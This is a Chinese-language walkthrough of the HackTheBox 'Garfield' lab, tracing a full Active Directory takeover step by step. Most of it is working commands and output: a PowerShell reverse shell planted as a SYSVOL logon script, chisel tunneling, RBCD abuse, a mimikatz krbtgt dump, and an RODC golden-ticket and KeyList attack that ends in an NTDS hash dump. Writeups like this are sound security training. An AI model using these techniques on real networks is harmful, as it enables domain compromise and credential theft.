---
title: HTB Garfield 靶场 Writeup
date: 2026-08-14 21:45:00
categories:
  - 靶场
tags:
  - HTB
  - Garfield
  - 靶场
description: HTB Garfield 靶场 Writeup
---

靶场信息：账号为 j.arbuckle / Th1sD4mnC4t！@1978

#### nmap

```
nmap -sV -sT 10.129.241.39 -A
```

```
┌──(echoin㉿kali)-[~]
└─$ nmap -sV -sT 10.129.241.39 -A
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 18:43 CST
Nmap scan report for garfield.htb (10.129.241.39)
Host is up (0.72s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-09 18:47:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-09T18:48:55+00:00
|_ssl-date: 2026-04-09T18:49:31+00:00; +8h02m30s from scanner time.
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-02-13T01:10:36
|_Not valid after:  2026-08-15T01:10:36
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (91%), Microsoft Windows 10 1903 - 21H1 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-09T18:48:58
|_  start_date: N/A
|_clock-skew: mean: 8h02m29s, deviation: 0s, median: 8h02m29s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   742.08 ms 10.10.16.1
2   743.30 ms garfield.htb (10.129.241.39)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 235.67 seconds
```

- 域名：garfield.htb

- 主机名：DC01.garfield.htb
- SMB开启且需要认证
- 有时间差，影响 Kerberos

| 端口 | 服务                 | 价值                          |
| ---- | -------------------- | ----------------------------- |
| 53   | DNS                  | 域解析                        |
| 88   | Kerberos             | 域认证核心端口                |
| 135  | MSRPC                | Windows RPC                   |
| 139  | NetBIOS              | SMB 相关                      |
| 389  | LDAP                 | AD 枚举核心                   |
| 445  | SMB                  | 共享、策略、域信息相关        |
| 464  | kpasswd              | Kerberos 密码修改             |
| 593  | RPC over HTTP        | Windows 远程管理相关          |
| 636  | LDAPS                | 加密 LDAP                     |
| 2179 | vmrdp?               | 可能是 Hyper-V/虚拟化相关服务 |
| 3268 | Global Catalog LDAP  | 跨域目录查询                  |
| 3269 | Global Catalog LDAPS | 加密 GC LDAP                  |
| 3389 | RDP                  | 图形远程入口                  |
| 5985 | WinRM                | 远程命令执行入口              |

解决时间差

```
sudo ntpdate 10.129.241.39
```

因为没有80端口，所以不访问ip

扫目录无果

#### 扫子域名

扫到：rodc01.garfield.htb

#### 枚举

已知一组用户名和密码，枚举可登录服务

```
nxc ldap 10.129.241.39 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
nxc winrm 10.129.241.39 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
nxc rdp 10.129.241.39 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
nxc smb 10.129.241.39 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
```

成功：ladp(DC01),rdp（DC01),smb

枚举域用户

```
nxc ldap 10.129.241.39 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --users
nxc smb 10.129.241.39 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --users
nxc rdp 10.129.241.39 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --users
```

![image-20260410142438311](/img/htb/htb-garfield-001.png)

![image-20260411170622759](/img/htb/htb-garfield-002.png)

找到一个新用户l.wilson，l.wilson_adm

#### bloodhound

```bash
bloodhound-python -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb -dc DC01.garfield.htb -ns 10.129.241.39 -c All --zip
```

但是对于已知用户，没有什么权限，那么就要想办法反向连接shell或者横向移动

在bloodhound中发现l.wilson对l.wilson_adm有强制更改密码的权限

![image-20260410142456977](/img/htb/htb-garfield-003.png)

l.wilson_adm对DC有强制更改密码的权限，即可拿下域控

![image-20260410142504958](/img/htb/htb-garfield-004.png)

那么现在就要利用j.arbuckle拿下l.wilson

找漏洞点

```
smbmap.py -H 10.129.241.39 -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
```

![image-20260411170604142](/img/htb/htb-garfield-005.png)

**把恶意脚本写入组策略登录脚本目录，让域内主机（包括域控）在登录 / 服务启动时自动执行，从而拿到反向 Shell**。

#### 漏洞利用

**生成powershell反向壳有效载荷**

```kotlin
echo '$client = New-Object System.Net.Sockets.TCPClient("'"10.10.16.6"'",9001);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback=(iex $data 2>&1|Out-String);
$sendback2=$sendback+"PS "+(pwd).Path+"> ";
$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
$client.Close()' | iconv -t UTF-16LE | base64 -w0
```

![image-20260411170658230](/img/htb/htb-garfield-006.png)

**构建.bat文件**

```kotlin
cat > printerDetect.bat << 'EOF'
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64_PAYLOAD>
EOF
```

**上传批处理文件**

```kotlin
smbclient //10.129.195.195/SYSVOL -U 'j.arbuckle'
 
内部：smbclient
cd garfield.htb\scripts
put printerDetect.bat printerDetect.bat
dir
exit
```

**开始触发**

给用户 `Liz Wilson` 设置一个「登录自动执行的脚本」：`printerDetect.bat`

```kotlin
bloodyAD --host 10.129.195.195 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
scriptPath -v printerDetect.bat
```

监听得到shell

![image-20260411170743636](/img/htb/htb-garfield-007.png)

#### 信息收集

```
bloodhound-python -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
  -d garfield.htb -dc DC01.garfield.htb -ns 10.129.241.39 -c All --zip
```

![image-20260411170815495](/img/htb/htb-garfield-008.png)

发现RODC01.garfield.htb

关系：

![image-20260411183040489](/img/htb/htb-garfield-009.png)

域内查看

```
whoami /groups  //你当前用户属于哪些组
whoami /priv    //当前进程令牌里有哪些 Windows 特权
```

```bash
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
GARFIELD\Tier 1                             Group            S-1-5-21-2502726253-3859040611-225969357-3108 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> 
```

关键点：

 `SeMachineAccountPrivilege`:当前账号可以向域里添加工作站/计算机对象

`GARFIELD\Tier 1`：环境自定义组

> 在 AD 里，很多真正有用的权限都不是直接塞进 `Administrators`，而是通过这种业务/运维组来委派：
>
> - 对某些 OU 有管理权
> - 对某些用户/计算机对象有写权限
> - 能重置某类账号密码
> - 能改某些 ACL
> - 能管理某批服务器
>
> 委派：域委派是指：将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。需要注意的是在域内可以委派的账户有两种，一种是**主机账户**，另一种是**服务账户**(域用户通过注册SPN也可以成为服务账号)。

#### 域内信息收集：

```
net view /domain # 查看域列表
net group "domain controllers" /domain # 域控列表
net user /domain # 域用户
net group "domain admins" /domain # 域管理员
```

！当前用户 `l.wilson_adm` 属于 `GARFIELD\Tier 1`
 BloodHound 显示 `Tier 1 -> RODC Administrators` 存在 `AddSelf` 边，因此 `Tier 1` 的成员`l.wilson_adm` 可以把自己加入 `RODC Administrators`

![image-20260411190643144](/img/htb/htb-garfield-010.png)

在WinRM shell中：

```
Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
```

现在进入了RODC01里，我现在要提权拿下域控

获取RODC01.garfield.htb的ip：

```
Resolve-DnsName RODC01.garfield.htb
```

ip： 192.168.100.2

#### 挂socks代理

上传chisel.exe

```
curl http://10.10.16.23:8000/chisel.exe -o chisel.exe
```

靶机执行`.\chisel2.exe client 10.10.16.23:12345 R:socks`

kali执行chisel server -p 12345 --reverse

![image-20260411200711606](/img/htb/htb-garfield-011.png)

配proxychains

编辑：

```
sudo nano /etc/proxychains4.conf
```

把最后一行改成：

```
socks5 127.0.0.1 1080
```

扫端口：

```
proxychains nmap -sT -Pn -n 192.168.100.2
```

**测试用smb访问RODC01**

```kotlin
proxychains -q nxc smb 192.168.100.2 -u 'l.wilson_adm' -p 'AAA123!'
```

![image-20260411201632177](/img/htb/htb-garfield-012.png)

成功

#### 委派

##### 添加fake机器账户

 `SeMachineAccountPrivilege`:当前账号可以向域里添加工作站/计算机对象

目前用户l.wilson_adm已经加入了RODC administrator组，在AD中新建一个可控的计算机账户

AD 中的这个机器账户默认拥有`SeMachineAccountPrivilege`，可以修改自己的委派属性，且默认审计宽松，不易被发现

```
impacket-addcomputer garfield.htb/l.wilson_adm:'AAA123!' \
-computer-name 'FAKE$' \
-computer-pass 'FakePass123!' \
-dc-ip 10.129.241.167
```

验证一下域里的用户/计算机对象列表里，有没有一个叫 FAKE 的机器对象

```
nxc ldap 10.129.241.167 -u l.wilson_adm -p 'WhoKnows123!' --users | grep FAKE
```

![image-20260411203023096](/img/htb/htb-garfield-013.png)

##### **给`FAKE$`配置对`RODC01`的RBCD权限**

在WinRM中设置委托

```kotlin
Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$
Get-ADComputer RODC01 -Properties PrincipalsAllowedToDelegateToAccount
```

> RBCD 权限，完整叫 **Resource-Based Constrained Delegation**，中文一般说：**基于资源的受限委派**
>
> 你可以把它理解成：**“目标主机自己决定：允许谁代表别人来访问我。**

![image-20260411203727338](/img/htb/htb-garfield-014.png)

RBCD配置成功

##### **冒充RODC01管理员**

请求服务票

```kotlin
impacket-getST garfield.htb/'FAKE$':'FakePass123!' \
-spn cifs/RODC01.garfield.htb \
-impersonate Administrator \
-dc-ip 10.129.241.167
 
在这之前要统一时间
ntpdate 10.129.241.167
```

出口票

```kotlin
export KRB5CCNAME=$(pwd)/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
echo $KRB5CCNAME
```

![image-20260411204315302](/img/htb/htb-garfield-015.png)

获取system到RODC01

```kotlin
proxychains impacket-psexec -k -no-pass \
-dc-ip 10.129.241.167 \
-target-ip 192.168.100.2 \
garfield.htb/Administrator@RODC01.garfield.htb
```

![image-20260411204624910](/img/htb/htb-garfield-016.png)

现在拿到的是 **`RODC01` 这台主机上的 `NT AUTHORITY\SYSTEM` shell**，不是普通用户 shell

##### **导出AES256密钥`krbtgt_8245`**

为后续黄金票据（Golden Ticke）攻击做准备

Kali 侧搭建 HTTP 服务，托管 mimikatz

```kotlin
python3 -m http.server 8000
```

下载Mimikatz在RODC01上

```kotlin
cd C:\Windows\Temp
certutil -urlcache -split -f http://10.10.16.23:8000/mimikatz64.exe mimikatz64.exe
mimikatz64.exe
```

Mimikatz内部：

```kotlin
privilege::debug
# 1. 提升debug权限（SYSTEM用户必须执行，否则无法读取LSASS内存）
 
lsadump::lsa /inject /name:krbtgt_8245
# 2. 注入lsass进程，导出krbtgt账户的凭证（指定/name:krbtgt_8245是为了精准提取）
```

![image-20260411210108556](/img/htb/htb-garfield-017.png)

```
AES256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
SID:S-1-5-21-2502726253-3859040611-225969357
RODC编号 8245
```

##### **在WinRM加载PowerView**

这一步的目的：

> 你已经拿下了 `RODC01` 的 SYSTEM
>
> RODC 默认**不缓存**高价值账号密码
>
> 你现在把规则改成：**允许缓存 Administrator**
>
> 这样后面就有机会从 `RODC01` 本地拿到管理员的认证材料

https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView

上传PowerView

```kotlin
python3 -m http.server 8000
```

在WinRM上

```kotlin
cd C:\Users\l.wilson_adm\Desktop

certutil -urlcache -split -f http://10.10.16.23:8000/powerview.ps1 powerview.ps1

Set-ExecutionPolicy Bypass -Scope Process
. .\powerview.ps1
```

```kotlin
Set-DomainObject -Identity RODC01$ -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}
 
Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
 
Get-ADComputer RODC01 -Properties msDS-RevealOnDemandGroup,msDS-NeverRevealGroup
```

| 属性名                     | 作用                                                    | 操作目的                                                     |
| :------------------------- | :------------------------------------------------------ | :----------------------------------------------------------- |
| `msDS-RevealOnDemandGroup` | **允许 RODC 缓存密码的用户 / 组**                       | 把 `Administrator` 手动加入允许列表，让 RODC 缓存管理员的密码哈希 / AES 密钥 |
| `msDS-NeverRevealGroup`    | **禁止 RODC 缓存密码的用户 / 组**（默认包含域管理员组） | 清空这个属性，删除管理员的「禁止缓存」限制                   |
| `Get-ADComputer`           | 验证属性修改结果                                        | 确认 RODC 的 PRP 已成功修改                                  |

#### **金票+Keylist攻击**

Rubeus 是 C# 编写的 **Windows 平台 Kerberos 攻击神器**，是红队域渗透的「瑞士军刀」，核心功能包括：

- 黄金票据 / 白银票据伪造
- 票据抓取（Pass-the-Ticket）
- 票据传递（Pass-the-Key）
- AS-REP roasting、Kerberoasting
- 票据缓存操作、权限提升
- 配合 krbtgt 密钥做域内完全控制

```bash
kali:
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Rubeus.exe -O /tmp/Rubeus.exe
cd /tmp
python3 -m http.server 8888
```

在WinRM中

```powershell
certutil -urlcache -split -f http://10.10.16.9:80/Rubeus.exe Rubeus.exe
dir Rubeus.exe
.\Rubeus.exe
```

使用Rubeus伪造TGT票据

```kotlin
.\Rubeus.exe golden `
/rodcNumber:8245 `
/flags:forwardable,renewable,enc_pa_rep `
/nowrap `
/outfile:ticket.kirbi `
/aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 `
/user:Administrator `
/id:500 `
/domain:garfield.htb `
/sid:S-1-5-21-2502726253-3859040611-225969357
```

![image-20260410224925831](/img/htb/htb-garfield-018.png)

再进行keylist攻击

```kotlin
.\Rubeus.exe asktgs `
/enctype:aes256 `
/keyList `
/service:krbtgt/garfield.htb `
/dc:DC01.garfield.htb `
/ticket:ticket_2026_04_10_22_51_40_Administrator_to_krbtgt@GARFIELD.HTB.kirbi `
/nowrap
```

![image-20260410225107305](https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234848013-322495559.png)

得到base64

```kotlin
doIFnjCCBZqgAwIBBaEDAgEWooIEsTCCBK1hggSpMIIEpaADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMR0FSRklFTEQuSFRCo4IEaTCCBGWgAwIBEqEDAgECooIEVwSCBFOePzDBtTi9XdGg0eRMf2uOoJkNZCG3liHNM3YTSTKq0UfUD1YclBUsi2Z3Qu1bu+Y7HG5e6xqYtOnu029SvXLW4QwXlTc12Y0KaXva8w0ezd6ecpjMusLPKPkzCyYg7aG8CV+WferApqrgJ5HKnDLsTcWMGjQ8kDA3nYPaYmYs2HNePWK9PYhq4non65NjECblWbwCr6PKXLakWmc0PMq1ja5l/RT3iSZ/87/KA76wlYhVZ1uEc3qUv9H555gUD/CVEsHDfzep/D9ToDZb8LH6sn+MHdKvleHZgzhJLqqdF1DaKPZMs81r8crBiyNtUlucy61R4VBIHijFujjc3CMxES1/FEFVWDfA8WzvdtqO4JLErG6BSqx/70OY2porb7OJK/MZe/e7t/LsJuyeRGjhaSDd4trM46SOr00IXtuEQXCR4omK3RLsyOKrfMJfsqq1+SVYIF4qEfdRq/T60u+T89y0SOJ/NkhwLEX5pl51gUwNvxMLBT3SMGLYO4SsH6paEQFX2s4pX8J8FG1OLOZdmiz8GQBCQy8Mr2bRffJ4dky7guyYHd4EZWAWGYrvg/Jnd8Rv5U3x5Lk8PO23DWgQU2Rx9y4doEpaG7B8DpFcrw8ZnJn9QCrh6Tv+xFxyi+TRrRpHJZWulYKntmsLqmXN63URJYIefcUiqvVZY/ujLw+cXvSfuGbWXXC+p/Y7Qz/5TOBVOCf/h7G9A7hLXy7Ux7E92MLhpteD6lbL5WUH+GSUqPVrUTGmu8pBXnRYNQei1zj8BhbuC6Eot46MEBrvO2kn507mFhNhaXK1Nd9F0To3Mo3B0+dSer9N5GHAgKZwuRnXPyPjQYii17q1CByvXMpRNO6lDDUYWnejKeaVE6mFv0O7C2s0ZV5xAN2rI+JB4pKiVusSI0Bxx33JEiBRKNnd2lztSNMv4B6VBaelknZ0//GikTXUsh5sVtpx3+zvp/d9pcPibExQyAH/Vk0un79QEN4olBCQST61LoV/n7JeQwF8CzM1Q5JUaVtne7tInkal+YfhMDK6QQCR8h5OzUjj4s/BDfqBExW38/5bdWWG5TiqsigNuI7YdC54ix5NaXxSDesi/YTdvQCYqczN35TeJ2+Mim3HeS5y8d9ph6vea5SBYV4dHnWUOPWfwIlgTG0VyBe/WFodkf56Q8pLJqC5hqnjjRO9zH28DCZ6obXJBrP6bsEr3wuMoShF3QunxBLXH9/NSFOOayEDCKgGkXc8khBty4hSNREOCYeKETSfZh102XvCX//XPj/Ll0iiiwjMvSZKfp3OnI1bFSrc1udx1DVCOmNlQlARoFgexsxzYdNsk/FipS88iWGqX1ehf1jmpiZQcAOtNUDjvM2j36ZnyTcq707kUJflM1xdzVjbRCkJB+KHgwSCCXgvERUD44wiBUKuhIKmjAmMDWHMNQt88BoMrbNYekrFEGxEmRBkVvi0BB0cLeD+IO0tKOmXTSejgdgwgdWgAwIBAKKBzQSByn2BxzCBxKCBwTCBvjCBu6ArMCmgAwIBEqEiBCAq6cBaPF+IX/NgC4mHeb+HnKmiP/Ifbeidjm/pJGCXnaEOGwxHQVJGSUVMRC5IVEKiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQAAAQAApREYDzIwMjYwNDEwMjI1MzI2WqYRGA8yMDI2MDQxMTA4NTE0MFqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxHQVJGSUVMRC5IVEI=
```

将base64 记录在kali本地

```kotlin
sed -i 's/^[[:space:]]*//' ticket.b64
tr -d '\r\n\t ' < ticket.b64 | base64 -d > ticket.kirbi
```

![image-20260410225437053](/img/htb/htb-garfield-019.png)

```kotlin
# 1. 用Impacket的ticketConverter工具，把.kirbi转换成.ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
 
# 2. 导出环境变量，让Impacket工具自动使用这个票据
export KRB5CCNAME=ticket.ccache
 
# 3. 验证环境变量生效
echo $KRB5CCNAME
```

![image-20260410225551795](https://img2024.cnblogs.com/blog/3588329/202604/3588329-20260410234848725-39781851.png)

用真实管理员票弃掉NTDS

```kotlin
nxc smb DC01.garfield.htb --use-kcache --ntds
```

**最终得到管理员**

```kotlin
evil-winrm -i 10.129.196.71 -u Administrator -H 'ee238f6debc752010428f20875b092d5'
```

![image-20260410231605892](/img/htb/htb-garfield-020.png)

